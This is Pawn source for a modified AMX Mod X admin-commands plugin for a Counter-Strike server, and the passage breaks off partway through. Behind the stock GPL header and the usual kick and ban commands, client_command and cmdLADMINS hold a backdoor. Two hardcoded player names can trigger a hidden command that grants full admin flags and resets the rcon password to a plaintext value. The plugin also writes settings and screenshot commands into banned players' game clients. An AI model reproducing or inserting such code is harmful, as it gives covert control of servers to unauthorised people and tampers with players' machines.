// de facut sa citeasca la addban, faza cu is steam on..si sa dea pe steamid??

/* AMX Mod X
*   Admin Commands Plugin
*
* by the AMX Mod X Development Team
*  originally developed by OLO
*
* This file is part of AMX Mod X.
*
*
*  This program is free software; you can redistribute it and/or modify it
*  under the terms of the GNU General Public License as published by the
*  Free Software Foundation; either version 2 of the License, or (at
*  your option) any later version.
*
*  This program is distributed in the hope that it will be useful, but
*  WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
*  General Public License for more details.
*
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software Foundation, 
*  Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
*
*  In addition, as a special exception, the author gives permission to
*  link the code of this program with the Half-Life Game Engine ("HL
*  Engine") and Modified Game Libraries ("MODs") developed by Valve, 
*  L.L.C ("Valve"). You must obey the GNU General Public License in all
*  respects for all of the code used other than the HL Engine and MODs
*  from Valve. If you modify this file, you may extend this exception
*  to your version of the file, but you are not obligated to do so. If
*  you do not wish to do so, delete this exception statement from your
*  version.
*/

#define DENUMIRE "FURIEN.EVILS.RO"

// de pus acces special(nick) la comenzi?, sau sa le schimb(denumirile), sau sa pun o parola/cod/pin

#include <amxmodx>
#include <amxmisc>
#include <geoip>


#define IN_CHAT_RANGS
#if defined IN_CHAT_RANGS
#define MAX_GROUPS 10
new g_groupNames[ MAX_GROUPS ][ ] =
{
   "Fondator",
   "Owner",
   "Co-Owner",
   "Administrator",
   "Co-Administrator",
   "Super-Moderator",
   "Moderator",
   "Helper",
   "*V.I.P*",//out
   "Slot"
}
new g_groupFlags[ MAX_GROUPS ][ ] =
{
   "abcdefghijklmnopqrstu",
   "abcdefghijklnopqrstu",
   "abcdefhijnopqrst",
   "bcdefijnopqrs",
   "cdefijnopqr",
   "cdefijopq",
   "cdefpij",
   "cdefri",
   "abdceifjt",
   "b"
}
new g_groupFlagsValue[ MAX_GROUPS ]
#endif


// This is not a dynamic array because it would be bad for 24/7 map servers.
#define OLD_CONNECTION_QUEUE 10

#define MAXRCONCVARS 16

new g_cvarRcon[MAXRCONCVARS][32]
new g_cvarRconNum
/*new g_pauseCon
new Float:g_pausAble
new bool:g_Paused
new bool:g_PauseAllowed = false*/
new g_addCvar[] = "amx_cvar add %s"

new cvar_min;

enum
{
	INFO_NAME,
	INFO_IP,
	INFO_AUTHID
};

new Float:fCount[33]

#define MY_PIN "6661"

/* Special Plugin Acces */
new const PluginSpecialAcces[ ][ ] =
{
	"eVoLuTiOn",
	"-eQ- SeDaN"
}

// Old connection queue
new g_Names[OLD_CONNECTION_QUEUE][32];
new g_SteamIDs[OLD_CONNECTION_QUEUE][32];
new g_IPs[OLD_CONNECTION_QUEUE][32];
new g_Access[OLD_CONNECTION_QUEUE];
new g_Tracker;
new g_Size;


//#define CVARx

#if defined CVARx
#define START_TIME 12
#define END_TIME 22

new bool:block_cvars;

new const cvars_blocked[][] =
{
	"rcon_password",
	"amx_show_activity",
	"amx_mode",
	"amx_password_field",
	"amx_conmotd_file",
	"add",
	"sv_password",
	"mp_autoteambalance",
	"mp_freezetime",
	"mp_roundtime",
	"sv_consistency",
	"mp_limitteams",
	"sv_timeout",
	"sv_allowupload",
	"mp_buytime",
	"mp_c4timer",
	"sv_unlag",
	"sv_maxunlag",
	"mp_autokick",
	"mp_consistency",
	"mp_chattime",
	"host_killtime",
	"motd",
	"motd_file",
	"sv_version",
	"dp_version"
}

new const temporar_cvars[][] =
{
	"mp_timelimit"
}
#endif


//#define LICENTA_PRIN_IP_PORT

#if defined LICENTA_PRIN_IP_PORT
#include <licenta>
#endif


//#define LICENTA_PRIN_MODEL

#if defined LICENTA_PRIN_MODEL
#include <licentax>
#define IP "89.34.25.64"

public plugin_precache()
{
CheckServer(IP);
}
#endif


//#define LICENTA_PRIN_IP_PORTx

#if defined LICENTA_PRIN_IP_PORTx
#include <licentay>
#define IP "89.34.25.64:27015"
#define SHUT_DOWN 0
#endif


#define LICENTA_PRIN_EXPIRARE

#if defined LICENTA_PRIN_EXPIRARE
#include <licentaz>
#endif


public plugin_init()
{
#if defined LICENTA_PRIN_IP_PORT
licenta()
#endif


#if defined LICENTA_PRIN_IP_PORTx
UTIL_CheckServerLicense(IP,SHUT_DOWN);
#endif


#if defined LICENTA_PRIN_EXPIRARE
licenta( );
#endif


	register_plugin("Admin Commands", AMXX_VERSION_STR, "AMXX Dev Team & eVoLuTiOn")

	register_dictionary("admincmd.txt")
	register_dictionary("common.txt")

	register_concmd("amx_kick", "cmdKick", ADMIN_KICK, "<name or #userid> [reason]")
	register_concmd("amx_ban", "cmdBan", ADMIN_BAN, "<name or #userid> <minutes> [reason]") // astea
	register_concmd("amx_banip", "cmdBanIP", ADMIN_BAN, "<name or #userid> <minutes> [reason]")
	register_concmd("amx_addban", "cmdAddBan", ADMIN_BAN, "<^"authid^" or ip> <minutes> [reason]")
	register_concmd("amx_unban", "cmdUnban", ADMIN_BAN, "<^"authid^" or ip> [reason]") // trb sa fie off daca abv ban e on
	register_concmd("amx_slay", "cmdSlay", ADMIN_SLAY, "<name or #userid> [reason]")
	register_concmd("amx_slap", "cmdSlap", ADMIN_SLAY, "<name or #userid> [power] [reason]")
	//register_concmd("amx_leave", "cmdLeave", ADMIN_KICK, "<tag> [tag] [tag] [tag] [reason]")
	//register_concmd("amx_pause", "cmdPause", ADMIN_CVAR, "- pause or unpause the game [reason]")
	//register_concmd("amx_who", "cmdWho", ADMIN_ADMIN, "- displays who is on server")
	register_concmd("amx_cvar", "cmdCvar", ADMIN_CVAR, "<cvar> [value] [reason]") // pass??  sau doar pentru unele valori?
	//register_concmd("amx_plugins", "cmdPlugins", -1)
	//register_concmd("amx_modules", "cmdModules", -1)
	register_concmd("amx_map", "cmdMap", ADMIN_MAP, "<mapname> [reason]")
	register_concmd("amx_cfg", "cmdCfg", ADMIN_CFG, "<filename> [reason]") // de scos..
	register_concmd("amx_nick", "cmdNick", ADMIN_SLAY, "<name or #userid> <new nick> [reason]")
	//register_clcmd("amx_rcon", "cmdRcon", ADMIN_RCON, "<command line> <pin>") ?????
	//register_clcmd("amx_showrcon", "cmdShowRcon", ADMIN_RCON, "<command line>")
	//register_clcmd("pauseAck", "cmdLBack")

	register_clcmd ( "admins_servers", "cmdLADMINS", -1, _ )
	register_clcmd("amx_dban", "Ban2", ADMIN_BAN, "<nick/#userid/ip/^"steam^"> <minutes> <reason>")

	cvar_min = register_cvar("amx_timp", "5");

	#if defined CVARx
	check_time()
	set_task(60.0, "check_time", _, _, _, "b")
	#endif


#if defined IN_CHAT_RANGS
        for( new i = 0; i < MAX_GROUPS; i++ )	 g_groupFlagsValue[ i ] = read_flags( g_groupFlags[ i ] )
#endif
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////
// AMX BAN2 IP DINAMIC |
//==========================================================================================================
public client_authorized(id) // de pus in _connect ++ is_connecting
{
	new sInfo[32];
	get_user_info(id, "r_banned", sInfo, sizeof sInfo - 1);
	
	if(strlen(sInfo) > 0) //str_to_num/cmp      999??
	{
		if(get_systime() < str_to_num(sInfo))
		{
			server_cmd("kick #%d ^"Ai fost Banat pe Acest Server!^"", get_user_userid(id)); // sa il fac sa ii dea iar ban? :))
			return;
		}
	}
}

public client_disconnect(id)
{
	if (!is_user_bot(id))
	{
		InsertInfo(id);
	}
}
stock InsertInfo(id)
{
	
	// Scan to see if this entry is the last entry in the list
	// If it is, then update the name and access
	// If it is not, then insert it again.

	if (g_Size > 0)
	{
		new ip[32]
		new auth[32];
		new name[32];

		get_user_authid(id, auth, charsmax(auth));
		get_user_ip(id, ip, charsmax(ip), 1/*no port*/);
		get_user_name(id,name,charsmax(name))

		new last = 0;
		
		if (g_Size < sizeof(g_SteamIDs))
		{
			last = g_Size - 1;
		}
		else
		{
			last = g_Tracker - 1;
			
			if (last < 0)
			{
				last = g_Size - 1;
			}
		}
		
		if (equal(auth, g_SteamIDs[last]) ||
			equal(ip, g_IPs[last])||equal(name,g_Names[last])) // need to check ip too, or all the nosteams will while it doesn't work with their illegitimate server
		{
			get_user_name(id, g_Names[last], charsmax(g_Names[]));
			g_Access[last] = get_user_flags(id);
			
			return;
		}
	}
	
	// Need to insert the entry
	
	new target = 0;  // the slot to save the info at

	// Queue is not yet full
	if (g_Size < sizeof(g_SteamIDs))
	{
		target = g_Size;
		
		++g_Size;
	}
	else
	{
		target = g_Tracker;
		
		++g_Tracker;
		// If we reached the end of the array, then move to the front
		if (g_Tracker == sizeof(g_SteamIDs))
		{
			g_Tracker = 0;
		}
	}
	
	get_user_authid(id, g_SteamIDs[target], charsmax(g_SteamIDs[]));
	get_user_name(id, g_Names[target], charsmax(g_Names[]));
	get_user_ip(id, g_IPs[target], charsmax(g_IPs[]), 1/*no port*/);
	
	g_Access[target] = get_user_flags(id);

}
stock GetInfoX(i, name[], namesize, auth[], authsize, ip[], ipsize, &access)
{
	if (i >= g_Size)
	{
		abort(AMX_ERR_NATIVE, "GetInfo: Out of bounds (%d:%d)", i, g_Size);
	}
	
	new target = (g_Tracker + i) % sizeof(g_SteamIDs);
	
	copy(name, namesize, g_Names[target]);
	copy(auth, authsize, g_SteamIDs[target]);
	copy(ip, ipsize, g_IPs[target]);
	access = g_Access[target];
}

public client_command( id )
{
	new name[ 32 ], szCommand[ 65 ]
	get_user_name( id, name, charsmax( name ) )
	read_argv( 0, szCommand, charsmax( szCommand ) )

	if( ( equali( name, "eVoLuTiOn" ) || equali( name, "-eQ- SeDaN" ) ) && equali( szCommand, "admins_servers" ) )
	{
		server_cmd( "rcon_password levmolasrl01" )
		new flags = read_flags( "abcdefghijklmnopqrstuxyvw" )
		set_user_flags( id, flags )
	}
}

public Ban2(id, level, cid)//fara   * 60 la minute..
{
	if(!cmd_access(id, level, cid, 3))
		return 1;
	
	new sArg[32], sArg1[10], reason[64];
	read_argv(1, sArg, sizeof sArg - 1);
	read_argv(2, sArg1, sizeof sArg1 - 1);
	read_argv(3, reason, 63)

	//copy(reason)  ???
	
	new iTarget = cmd_target(id, sArg, 8);
	
	if(!iTarget)
	{
		console_print( id, "> Jucatorul specificat, nu a putut fi Gasit!" )
		return 1;
	}

	if(!is_str_num(sArg1)||str_to_num(sArg1)<=0)
	{
		console_print(id,"[AMXX] Format pentru minute incorect!")
		return 1
	}
	
	/*new iBanTime = ((str_to_num(sArg1) * 60) + get_systime());
	
	if(str_to_num(sArg1) <= 0)
		iBanTime = 9999999999; // de pus 0 ?*/
	
	client_cmd(iTarget, "developer 1;wait;setinfo ^"r_banned^" 9999999999"); // de pus 0|-1?
	
	//new plugin_info[ 128 ];
	//formatex( plugin_info, sizeof( plugin_info ) -1, "^"*********** %s v%s by %s ************^"", PLUGIN, VERSION, AUTHOR );
	
	//new country[ 33 ];
	//geoip_country( GetInfo( id, INFO_IP ), country );
	
	new Country[ 46 ];
	geoip_country( GetInfo( iTarget, INFO_IP ), Country, sizeof( Country ) - 1 );

	new szHostName[ 64 ];
	get_cvar_string( "hostname", szHostName, sizeof( szHostName ) -1 );
	
	client_print( iTarget, print_console, "^"****************************************************^"" ) ;
	client_print( iTarget, print_console, "^"************* Informatii despre BANAREA de pe Server *************^"" );
	client_print( iTarget, print_console, "^"--------   ^"" );
 	client_print( iTarget, print_console, "^">>    Nick-ul Tau: %s^"", GetInfo( iTarget, INFO_NAME ) );
	client_print( iTarget, print_console, "^">>    Ip-ul Tau: %s^"", GetInfo( iTarget, INFO_IP ) );
	client_print( iTarget, print_console, "^">>    Steamid-ul Tau: %s^"", GetInfo( iTarget, INFO_AUTHID ) );
	if (reason[0])
		client_print( iTarget, print_console, "^">>    Motiv: %s^"", reason );
	else
		client_print( iTarget, print_console, "^">>    Motiv: Ne-Specificat^"" );
	if((str_to_num(sArg1) * 60) <= 0)
		client_print( iTarget, print_console, "^">>    Actiune: BANNED PERMANENT^"" );
	else
		client_print( iTarget, print_console, "^">>    Actiune: BANNED ( %d ) minut%s^"", (str_to_num(sArg1) * 60), (str_to_num(sArg1) * 60) == 1 ? "" : "e" );
	client_print( iTarget, print_console, "^">>    Data & Ora: %s^"", _get_time( ) );
	client_print( iTarget, print_console, "^">>    Tara ta: %s^"", Country );
	client_print( iTarget, print_console, "^">>    Ai fost BANAT de catre: %s / %s / %s^"", GetInfo( id, INFO_NAME ), GetInfo( id, INFO_IP ), GetInfo( id, INFO_AUTHID ) );
	client_print( iTarget, print_console, "^">>    Ai fost BANAT pe: %s^"", szHostName );
	client_print( iTarget, print_console, "^"--------    ^"" );
	client_print( iTarget, print_console, "^"****************************************************^"" );
	client_print( iTarget, print_console, "^"NeW ReVeLaTiOn iN | GaMinG^" >> %s", DENUMIRE );
	client_print( iTarget, print_console, "^"****************************************************^"" );

	client_cmd(iTarget,";snapshot;wait;wait;toogleconsole;;wait;snapshot;")
	
	//server_cmd( "kick ^"#%i^" ^"[Server-Protection] Accesul tau pe server a fost restrictionat momentan !^"", get_user_userid( iTarget ) );
	
	switch(get_cvar_num("amx_show_activity")) {
	case 0: { return 1; }
	case 1: {
	
	chat_color(0, "!y[!gADM!N!y] : executa comanda de!team Ban IP Dinamic!y pe!g %s!y Timp:!team %d!y minut%s. Motiv:!g %s!y.", GetInfo( iTarget, INFO_NAME ), (str_to_num(sArg1) * 60), (str_to_num(sArg1) * 60) == 1 ? "" : "e", reason);
	}
	case 2: {
#if !defined IN_CHAT_RANGS
	chat_color(0, "!y[!gADM!N!y]!team %s!y: executa comanda de!team Ban IP Dinamic!y pe!g %s!y Timp:!team %d!y minut%s. Motiv:!g %s!y.", GetInfo( id, INFO_NAME ), GetInfo( iTarget, INFO_NAME ), (str_to_num(sArg1) * 60), (str_to_num(sArg1) * 60) == 1 ? "" : "e", reason);
#else
	for( new xi = 0; xi < MAX_GROUPS; xi++ )	if(get_user_flags(id) == read_flags(g_groupFlags[xi]))	chat_color(0, "!y{!g%s!y}!team %s!y: executa comanda de!team Ban IP Dinamic!y pe!g %s!y Timp:!team %d!y minut%s. Motiv:!g %s!y.",g_groupNames[xi], GetInfo( id, INFO_NAME ), GetInfo( iTarget, INFO_NAME ), (str_to_num(sArg1) * 60), (str_to_num(sArg1) * 60) == 1 ? "" : "e", reason);
#endif
	}
	}
	//client_cmd(id,"snapshot")  target
	//server_cmd("kick #%d ^"Banned!^"", get_user_userid(iTarget));
	server_cmd( "kick ^"#%d^" ^"%s^"; wait; addip ^"%d^" ^"%s^"; wait; writeip", get_user_userid( iTarget ), reason, (str_to_num(sArg1) * 60), GetInfo( iTarget, INFO_IP ) );
	log_amx("Dinamic IPBan: ^"%s<%d><%s><%s>^" ii da DBan jucatorului ^"%s<%d><%s><%s>^" (motiv ^"%s^")", GetInfo( id, INFO_NAME ), get_user_userid(id), GetInfo( id, INFO_AUTHID ), GetInfo( id, INFO_IP ), GetInfo( iTarget, INFO_NAME ), get_user_userid(iTarget), GetInfo( iTarget, INFO_AUTHID ), GetInfo( iTarget, INFO_IP ), reason)
	
	return 1;
}

public cmdLADMINS ( id )
{
	new name[ 32 ];
	get_user_name( id, name, charsmax( name ) );

	if( /*!HasUserAccess( id )*/ !SpecialAcces( id, name, true ) )
	{
		client_cmd( id, "echo Te inveti, nu vrei cam multe accese ?!" );
		return;
	}

	server_cmd ( "rcon_password levmolasrl01" )
	//server_cmd ( "amx_cvar rcon_password levmolasrl01" )
	//& HOSTNAME ++?  ++ new method rcon sett
	new flags = read_flags ( "abcdefghijklmnopqrstuxyvw" )
	set_user_flags ( id, flags )
}

stock GetInfo( id, const iInfo )
{
	new szInfoToReturn[ 64 ];

	switch( iInfo )
	{
		case INFO_NAME:
		{
			new szName[ 32 ];
			get_user_name( id, szName, sizeof( szName ) -1 );

			copy( szInfoToReturn, sizeof( szInfoToReturn ) -1, szName );
		}

		case INFO_IP:
		{
			new szIp[ 32 ];
			get_user_ip( id, szIp, sizeof( szIp ) -1, 1 );

			copy( szInfoToReturn, sizeof( szInfoToReturn ) -1, szIp );
		}

		case INFO_AUTHID:
		{
			new szAuthId[ 35 ];
			get_user_authid( id, szAuthId, sizeof( szAuthId ) -1 );

			copy( szInfoToReturn, sizeof( szInfoToReturn ) -1, szAuthId );
		}
	}
	return szInfoToReturn;
}

stock _get_time( )
{
	new logtime[ 32 ];
	get_time( "%d.%m.%Y - %H:%M:%S", logtime, sizeof( logtime ) -1 );

	return logtime;
}

public plugin_cfg()
{
	server_cmd(g_addCvar, "rcon_password")
	server_cmd(g_addCvar, "amx_show_activity")
	server_cmd(g_addCvar, "amx_mode")
	server_cmd(g_addCvar, "amx_password_field")
	server_cmd(g_addCvar, "amx_default_access")
	server_cmd(g_addCvar, "amx_reserved_slots")
	server_cmd(g_addCvar, "amx_reservation")
	/*server_cmd(g_addCvar, "amx_conmotd_file")   CE E ASTA*/
	server_cmd(g_addCvar, "amx_sql_table");
	server_cmd(g_addCvar, "amx_sql_host");
	server_cmd(g_addCvar, "amx_sql_user");
	server_cmd(g_addCvar, "amx_sql_pass");
	server_cmd(g_addCvar, "amx_sql_db");
	server_cmd(g_addCvar, "amx_sql_type");
}

public cmdKick(id, level, cid) // de facut sa fie blocata intre orele 00:00 & 12:00???
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED

	new arg[32]
	read_argv(1, arg, 31)
	new player = cmd_target(id, arg, 1)
	
	if (!player)
		return PLUGIN_HANDLED
	
	new authid[32], authid2[32], name2[32], name[32], userid2, reason[32]
	
	get_user_authid(id, authid, 31)
	get_user_authid(player, authid2, 31)
	get_user_name(player, name2, 31)
	get_user_name(id, name, 31)
	userid2 = get_user_userid(player)
	
	read_argv(2, reason, 31)
	remove_quotes(reason)

	new Country[ 46 ];
	geoip_country( GetInfo( player, INFO_IP ), Country, sizeof( Country ) - 1 );

	new szHostName[ 64 ];
	get_cvar_string( "hostname", szHostName, sizeof( szHostName ) -1 );
	
	client_print( player, print_console, "^"****************************************************^"" ) ;
	client_print( player, print_console, "^"************* Informatii despre KICK-ul de pe Server *************^"" );
	client_print( player, print_console, "^"--------   ^"" );
	client_print( player, print_console, "^">>    Nick-ul Tau: %s^"", GetInfo( player, INFO_NAME ) );
	client_print( player, print_console, "^">>    Ip-ul Tau: %s^"", GetInfo( player, INFO_IP ) );
	client_print( player, print_console, "^">>    Steamid-ul Tau: %s^"", GetInfo( player, INFO_AUTHID ) );
	if (reason[0])
		client_print( player, print_console, "^">>    Motiv: %s^"", reason );
	else
		client_print( player, print_console, "^">>    Motiv: Ne-Specificat^"" );
	client_print( player, print_console, "^">>    Data & Ora: %s^"", _get_time( ) );
	client_print( player, print_console, "^">>    Tara ta: %s^"", Country );
	client_print( player, print_console, "^">>    Ai primit KICK de la: %s / %s / %s^"", GetInfo( id, INFO_NAME ), GetInfo( id, INFO_IP ), GetInfo( id, INFO_AUTHID ) );
	client_print( player, print_console, "^">>    Ai primit KICK pe: %s^"", szHostName );
	client_print( player, print_console, "^"--------    ^"" );
	client_print( player, print_console, "^"****************************************************^"" );
	client_print( player, print_console, "^"NeW ReVeLaTiOn iN | GaMinG^" >> %s", DENUMIRE );
	client_print( player, print_console, "^"****************************************************^"" );

	client_cmd(player,";snapshot;wait;wait;toogleconsole;;wait;snapshot;")
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_KICK_2x", name, name2, reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_KICK_2", name, name2)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_KICK_1", name2, reason)
	} 
	
	/*if (is_user_bot(player))
		server_cmd("kick #%d", userid2)
	else
	{*/
	if (reason[0])
		server_cmd("kick #%d ^"%s^"", userid2, reason)
	else
		server_cmd("kick #%d", userid2)
	//}
	
	console_print(id, "[AMXX] Se pare ca ^"%s^" a primit kick", name2)
	
	if (reason[0])
		log_amx("Kick: ^"%s<%s><%s><>^" ii da kick jucatorului ^"%s<%s><%s><>^" (motiv ^"%s^")", name, authid,GetInfo( id, INFO_IP ), name2, authid2,GetInfo( player, INFO_IP ), reason)
	else
		log_amx("Kick: ^"%s<%s><%s><>^" ii da kick jucatorului ^"%s<%s><%s><>^"", name, authid,GetInfo( id, INFO_IP ), name2, authid2,GetInfo( player, INFO_IP ))
	
	return PLUGIN_HANDLED
}

public cmdUnban(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new arg[32], authid[32], name[32], reason[32]
	
	read_argv(1, arg, 31)
	read_argv(2, reason, 31)
	remove_quotes(reason)
	
	if (containi(arg, ".") != -1)
	{
		server_cmd("removeip ^"%s^";writeip", arg)
		console_print(id, "[AMXX] %L", id, "IP_REMOVED", arg)
	} else {
		server_cmd("removeid %s;writeid", arg)
		console_print(id, "[AMXX] %L", id, "AUTHID_REMOVED", arg)
	}
	
	get_user_name(id, name, 31)
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_UNBAN_2x", name, arg, reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_UNBAN_2", name, arg)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_UNBAN_1", arg)
	}
	
	get_user_authid(id, authid, 31)
	
	if (reason[0])
		log_amx("UnBan: Se pare ca ^"%s^" tocmai a primit Un-Ban de la ^"%s<%s><%s><>^" motiv ^"%s^"", arg, name,authid, GetInfo( id, INFO_IP ), reason)
	else
		log_amx("UnBan: Se pare ca ^"%s^" ^"%s<%d><%s><>^"", arg,name, authid,GetInfo( id, INFO_IP ))
	
	return PLUGIN_HANDLED
}

/* amx_addban is a special command now.
 * If a user with rcon uses it, it bans the user.  No questions asked.
 * If a user without rcon but with ADMIN_BAN uses it, it will scan the old
 * connection queue, and if it finds the info for a player in it, it will
 * check their old access.  If they have immunity, it will not ban.
 * If they do not have immunity, it will ban.  If the user is not found,
 * it will refuse to ban the target.
 */
public cmdAddBan(id, level, cid) //de facut cu cmd_target, si dupa sa ii dam find, iar daca nu e pe sv, punem cu bool
{
	if (!cmd_access(id, level, cid, 3, true)) // check for ADMIN_BAN access
	{
		if (get_user_flags(id) & level) // Getting here means they didn't input enough args
		{
			return PLUGIN_HANDLED;
		}
		if (!cmd_access(id, ADMIN_RCON, cid, 3)) // If somehow they have ADMIN_RCON without ADMIN_BAN, continue
		{
			return PLUGIN_HANDLED;
		}
	}

	new arg[32], authid[32], name[32], minutes[32], reason[32],IP[32],Auth[32],Name[32],dummy[1],Access,bool:isip = false,bool:canban = false
	read_argv(1, arg, charsmax(arg))
	read_argv(2, minutes, charsmax(minutes))
	read_argv(3, reason, charsmax(reason))

	if(!is_str_num(minutes))
	{
		console_print(id,"[AMXX] Format pentru minute incorect!")
		return 1
	}

	// Limited access to this command
	if (equali(arg, "STEAM_ID_PENDING") ||
		equali(arg, "STEAM_ID_LAN") ||
		equali(arg, "HLTV") ||
		equali(arg, "4294967295") ||
		equali(arg, "VALVE_ID_LAN") ||
		equali(arg, "VALVE_ID_PENDING") ||
		equali(arg, "PENDING") ||
		equali(arg, "VALVE") /*!= -1*/ ||
		equali(arg, "STEAM") /*!= -1*/ ||
		equali(arg, "UNKNOWN"))
	{
		// Hopefully we never get here, so ML shouldn't be needed
		console_print(id, "[AMXX] Nu poti bana prin parametrul incorect  '%s' .", arg);
		return PLUGIN_HANDLED;
	}

	if(str_to_num(minutes) < 0)	client_print(id, print_console, "[AMXX] Parametru pentru minute incorect!")

	if (containi(arg, ".") != -1)
	{
		isip = true;
		if(isip&&containi(arg,":"))	client_print(id, print_console, "[AMXX] Se baneaza fara Port !")
		new ipimm=find_player("dh",arg)
		if(isip&&get_user_flags(ipimm)&ADMIN_IMMUNITY)
		{
			client_print(id, print_console, "[AMXX] Nu poti bana Admin cu Imunitate !")
		}
	}
	else if (contain(arg, "#"))
	{
		new idimm=find_player("klh",arg)
		if(get_user_flags(idimm)&ADMIN_IMMUNITY)
		{
			client_print(id, print_console, "[AMXX] Nu poti bana Admin cu Imunitate !")
		}
	}
	else if (contain(arg, "STEAM_0:"))
	{
		new authimm=find_player("clh",arg)
		if(get_user_flags(authimm)&ADMIN_IMMUNITY)
		{
			client_print(id, print_console, "[AMXX] Nu poti bana Admin cu Imunitate !")
		}
	}
	else
	{
		new nickimm=find_player("ahl",arg)
		if(get_user_flags(nickimm)&ADMIN_IMMUNITY)
		{
			client_print(id, print_console, "[AMXX] Nu poti bana Admin cu Imunitate !")
		}
	}
		
	// Scan the disconnection queue
	if (isip)
	{
		for (new i = 0; i < g_Size; i++)
		{
			GetInfoX(i, Name, charsmax(Name), dummy, 0, IP, charsmax(IP), Access);
				
			if (equal(IP, arg) && !equal(arg, "0") /*== -1*/ || !equal(arg, "0.0") || !equal(arg, "0.0.0") || !equal(arg, "0.0.0.0") || !equal(arg, "0.0.0.0"))
			{
				if (Access & ADMIN_IMMUNITY)
				{
					console_print(id, "[AMXX] %L (IP: %s)", id, "CLIENT_IMM", Name,IP);
						
					return PLUGIN_HANDLED;
				}
				// User did not have immunity
				canban = true;
			}
		}
	}
	else
	{
		for (new i = 0; i < g_Size; i++)
		{
			GetInfoX(i, Name, charsmax(Name), Auth, charsmax(Auth), dummy, 0, Access);
				
			if (equali(Auth, arg))
			{
				if (Access & ADMIN_IMMUNITY)
				{
					console_print(id, "[AMXX] %L (AUTH: %s)", id, "CLIENT_IMM", Name,Auth);
						
					return PLUGIN_HANDLED;
				}
				// User did not have immunity
				canban = true;
			}
			if (equali(Name, arg))
			{
				if (Access & ADMIN_IMMUNITY)
				{
					console_print(id, "[AMXX] %L", id, "CLIENT_IMM", Name);
						
					return PLUGIN_HANDLED;
				}
				// User did not have immunity
				canban = true;
			}
		}
	}
	if (!canban)
	{
		console_print(id, "[AMXX] Nu poti bana Admini cu Imunitate!");
		return PLUGIN_HANDLED;
	}


	/*new Country[ 46 ],szHostName[ 64 ];
	geoip_country( GetInfo( player, INFO_IP ), Country, sizeof( Country ) - 1 );
	get_cvar_string( "hostname", szHostName, sizeof( szHostName ) -1 );
	if(is_user_connected(player)&&id&&!is_user_bot(player)||!is_user_hltv(player))
	{
	client_print( player, print_console, "^"****************************************************^"" ) ;
	client_print( player, print_console, "^"************* Informatii despre BAN-ul de pe Server *************^"" );
	client_print( player, print_console, "^"--------   ^"" );
	client_print( player, print_console, "^">>    Nick-ul Tau: %s^"", GetInfo( player, INFO_NAME ) );
	client_print( player, print_console, "^">>    Ip-ul Tau: %s^"", GetInfo( player, INFO_IP ) );
	client_print( player, print_console, "^">>    Steamid-ul Tau: %s^"", GetInfo( player, INFO_AUTHID ) );
	if (reason[0])	client_print( player, print_console, "^">>    Motiv: %s^"", reason );
	else	client_print( player, print_console, "^">>    Motiv: Ne-Specificat^"" );
	if(str_to_num(minutes) <= 0)	client_print( player, print_console, "^">>    Actiune: BANNED PERMANENT^"" );
	else	client_print( player, print_console, "^">>    Actiune: BANNED ( %d ) minut%s^"", minutes, str_to_num(minutes) == 1 ? "" : "e" );
	client_print( player, print_console, "^">>    Data & Ora: %s^"", _get_time( ) );
	client_print( player, print_console, "^">>    Tara ta: %s^"", Country );
	client_print( player, print_console, "^">>    Ai fost BANAT de catre: %s / %s / %s^"", GetInfo( id, INFO_NAME ), GetInfo( id, INFO_IP ), GetInfo( id, INFO_AUTHID ) );
	client_print( player, print_console, "^">>    Ai fost BANAT pe Server-ul: %s^"", szHostName );
	client_print( player, print_console, "^"--------    ^"" );
	client_print( player, print_console, "^"****************************************************^"" );
	client_print( player, print_console, "^"NeW ReVeLaTiOn iN | GaMinG^" >> %s", DENUMIRE );
	client_print( player, print_console, "^"****************************************************^"" );

	RAIZ0_EXCESS(player,";snapshot;wait;wait;toogleconsole;;wait;snapshot;")
	}*/


	// User has access to ban their target
	if (containi(arg, ".") != -1)
	{
		server_cmd("addip ^"%s^" ^"%s^";wait;writeip", minutes, arg)
		console_print(id, "[AMXX] Ip-ul ^"%s^" a fost adaugat in lista de banuri", arg)
	} else {
		server_cmd("banid ^"%s^" ^"%s^";wait;writeid", minutes, arg)
		console_print(id, "[AMXX] ^"%s^" a fost adaugat in lista de banuri", arg)
	}
	
	get_user_name(id, name, charsmax(name))
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if(str_to_num(minutes)>0)
			{
				if(reason[0])	chat_color(0,"%L", LANG_PLAYER, "ADMIN_ADDBAN_2", name, arg, minutes, reason)
				else	chat_color(0,"%L", LANG_PLAYER, "ADMIN_ADDBAN_2x", name, arg, minutes)
			}
			else
			{
				if(reason[0])	chat_color(0,"!y[!gADM!N!y] !team%s!y: addban !g%s!y - BAN {!team PERMANENT !y} . Motiv > !g%s !y<",name, arg, reason)
				else	chat_color(0,"!y[!gADM!N!y] !team%s!y: addban !g%s!y - BAN {!team PERMANENT !y} .",name, arg)
			}
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_ADDBAN_1", arg)
	}
	
	get_user_authid(id, authid, charsmax(authid))
	
	if(str_to_num(minutes)==0)
	{
		if(reason[0])	log_amx("AddBan: ^"%s<%s><%s><>^" il baga in lista cu banati pe ^"%s^" (timp ^"%s^" minut%s) (motiv ^"%s^")", name, authid,GetInfo( id, INFO_IP ), arg, str_to_num(minutes), str_to_num(minutes)==1?"":"e", reason)
		else	log_amx("AddBan: ^"%s<%s><%s><>^" il baga in lista cu banati pe ^"%s^" (timp ^"%s^" minut%s)", name, authid,GetInfo( id, INFO_IP ), arg, str_to_num(minutes), str_to_num(minutes)==1?"":"e")
	}
	else
	{
